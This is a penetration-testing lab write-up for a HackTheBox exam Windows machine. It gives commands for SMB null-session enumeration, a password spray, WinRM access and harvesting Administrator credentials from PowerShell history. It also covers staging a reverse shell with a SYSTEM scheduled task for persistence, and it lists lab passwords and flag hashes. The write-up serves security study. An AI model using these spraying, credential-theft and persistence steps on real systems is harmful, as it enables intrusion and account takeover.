---
title: "WIN01"
category: "labs"
tags: []
excerpt: ""
date: "2026-04-30"
---

---
## Target Information

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Target Information:</span></summary>
<div class="callout-body">

```
IP Address: 10.129.17.36 (also appeared as 10.129.13.130 across resets)
Hostname:   WIN01.luminex.htb (inferred)
OS:         Windows
Platform:   HackTheBox CJCA Exam
```

</div>
</details>

---
## Timeline

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Timeline:</span></summary>
<div class="callout-body">

```
2026-04-25 — Nmap: SMB, RDP, WinRM identified
2026-04-25 — Null session SMB confirmed; user list enumerated
2026-04-25 — SMB password spray with employee credential list from NIX01 init.sql
2026-04-25 — john:1234567890 authenticated; WinRM/evil-winrm access as john
2026-04-25 — winPEAS run; Administrator credentials in PowerShell history discovered
2026-04-25 — RDP as Administrator; dropped reverse shell, created scheduled task
```

</div>
</details>

---
## Enumeration

### Port Scan Results

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Port Scan Results:</span></summary>
<div class="callout-body">

```
nmap -oN WIN01-TCP-Ports -T5 -sT -p- -Pn <target-ip>

PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds (SMB)
3389/tcp  open  ms-wbt-server (RDP)
47001/tcp open  winrm
```

</div>
</details>

### Service Enumeration

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Service Enumeration:</span></summary>
<div class="callout-body">

```
# SMB null session / guest enumeration
nxc smb <target-ip> -u '' -p '' --users
nxc smb <target-ip> -u guest -p '' --shares
# Null session allowed — user enumeration succeeded
```

</div>
</details>

---
## Foothold

### Vulnerability Identified

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Vulnerability Identified:</span></summary>
<div class="callout-body">

```
SMB password spray — credentials from NIX01 /root/.docker/init.sql contained
john:1234567890, a valid local account on WIN01. Approximately 300 automated NTLM
spray attempts before success. Credential discovered via the employee database
extracted from the Luminex Ltd. database on NIX01.
```

</div>
</details>

### Exploitation Steps

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Exploitation Steps:</span></summary>
<div class="callout-body">

```
# 1. Spray employee credentials over SMB
nxc smb <target-ip> -u <userlist> -p 1234567890 --continue-on-success
# john authenticated successfully

# 2. WinRM shell as john
evil-winrm -i <target-ip> -u john -p '1234567890'

# 3. Run winPEAS — it reads PowerShell history and flags Administrator credentials
# Found in: C:\Users\john\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
# Contents: $Username = Administrator / $Password = mdm0axd*EQM7xmq.krn
```

</div>
</details>

---
## Privilege Escalation

### Vector Identified

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Vector Identified:</span></summary>
<div class="callout-body">

```
Plaintext Administrator credentials in john's PowerShell history (PSReadline).
A previous admin session used hardcoded credentials in Invoke-Command, which
PSReadline logged verbatim. winPEAS flagged and read the history file.

ConsoleHost_history.txt contents:
$Username = Administrator
$Password = mdm0axd*EQM7xmq.krn
```

</div>
</details>

### Steps Taken

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Steps Taken:</span></summary>
<div class="callout-body">

```
# 1. Read PowerShell history directly
type C:\Users\john\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

# 2. RDP as Administrator
xfreerdp /u:Administrator /p:'mdm0axd*EQM7xmq.krn' /v:<target-ip>

# 3. Stage reverse shell via RDP session
# Copy revshell1337.exe to C:\Users\Administrator\AppData\Local\

# 4. Create scheduled task for persistence
schtasks /create /tn "Check" /tr "C:\Users\Administrator\AppData\Local\revshell1337.exe" /sc minute /mo 2 /ru SYSTEM /f
```

</div>
</details>

---
## Flags

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Flags:</span></summary>
<div class="callout-body">

```
User (john):          e4e9a0efc1cf23b5c795484ad0504d66
Root (Administrator): 96f0352867e0f6783791714b02b59e13
```

</div>
</details>

---
## Loot

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Loot:</span></summary>
<div class="callout-body">

```
john:1234567890                 — local user, SMB/WinRM access
Administrator:mdm0axd*EQM7xmq.krn — plaintext in john's PowerShell history
```

</div>
</details>

---
## Rabbit Holes

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Rabbit Holes:</span></summary>
<div class="callout-body">

```
- crackmapexec (cme) is broken/deprecated — spent time trying apt, pipx, and manual
git clone installs before switching to nxc (netexec). nxc has an identical interface
and installs cleanly: pipx install netexec.

- Stalled on initial access because the employee credential list from NIX01 init.sql
had not been fully retrieved before moving here. Had to return to NIX01 to collect
all user/password pairs before the spray succeeded.
```

</div>
</details>

---
## Lessons Learned

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Lessons Learned:</span></summary>
<div class="callout-body">

```
- crackmapexec is deprecated. Always use nxc (netexec) — same interface, actively
maintained. Install: pipx install netexec
- Check PSReadline history early during Windows post-exploitation:
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
- Collect ALL credentials from Linux pivot hosts before attacking Windows targets.
Employee databases and init.sql files are high-yield pivot sources.
```

</div>
</details>

---
## Related Concepts
- [Windows Fundamentals](/knowledge/Operating-Systems/Windows/Windows-Fundamentals)
- [Windows Remote Management](/knowledge/Operating-Systems/Windows/Windows-Remote-Management)
- [SMB](/knowledge/Networking/SMB)
- [Windows PowerShell](/knowledge/Operating-Systems/Windows/Windows-PowerShell)

## Related Playbooks
- [Windows Pentest Playbook](/playbooks/Windows-Pentest-Playbook)

## Related Tools
- [NetExec](/tools/Enumeration/NetExec)
- [evil-winrm](/tools/Post-Exploitation/evil-winrm)
- [PEASS-ng](/tools/Post-Exploitation/PEASS-ng)
- [xfreerdp](/tools/Utilities/xfreerdp)
- [Nmap](/tools/Enumeration/Nmap)

---
## References / Images
- MSF Module Options
- john SMB Access
- Administrator Access
- john Credential Reuse and User Flag
- Administrator Password in PS History
- Administrator Login and Root Flag
- Administrator Login and Root Flag (alt)
